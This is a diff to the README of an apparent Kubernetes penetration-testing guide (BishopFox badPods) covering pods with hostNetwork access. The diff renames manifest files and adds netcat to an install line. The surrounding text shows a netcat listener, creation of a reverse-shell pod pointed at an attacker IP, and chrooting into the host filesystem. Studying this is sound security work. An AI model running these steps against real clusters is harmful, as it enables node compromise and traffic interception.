@@ -24,16 +24,16 @@ spec:
     name: hostnetwork
   #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  
   ```
-[pod-hostnetwork.yaml](pod-hostnetwork.yaml)
+[hostnetwork-exec.yaml](hostnetwork-exec.yaml)
 
 #### Option 1: Create pod from local yaml 
 ```bash
-kubectl apply -f pod-hostnetwork.yaml   
+kubectl apply -f hostnetwork-exec.yaml   
 ```
 
 #### Option 2: Create pod from github hosted yaml
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostnetwork/pod-hostnetwork.yaml  
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostnetwork/hostnetwork-exec.yaml  
 ```
 
 ### Exec into pod 
@@ -59,7 +59,7 @@ spec:
   #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name
   restartPolicy: Always
   ```
-[pod-hostnetwork-revshell.yaml](pod-hostnetwork-revshell.yaml)
+[hostnetwork-revshell.yaml](hostnetwork-revshell.yaml)
 
 #### Set up listener
 ```bash
@@ -69,7 +69,7 @@ nc -nvlp 3116
 #### Create the pod
 ```bash
 # Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
-HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/hostnetwork/pod-hostnetwork-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/hostnetwork/hostnetwork-revshell.yaml | kubectl apply -f -
 ```
 
 #### Catch the shell and chroot to /host 
@@ -85,7 +85,7 @@ Connection received on 10.0.0.162 42035
 **Note:** If you can't install tools to your pod (no internet access), you will have to change the image in your pod yaml to something that already includes `tcpdump`, like https://hub.docker.com/r/corfr/tcpdump
 
 ```bash
-apt update && apt install tcpdump 
+apt update && apt -y install tcpdump net-tools netcat
 ```
 You now have a few options for next steps: 
 
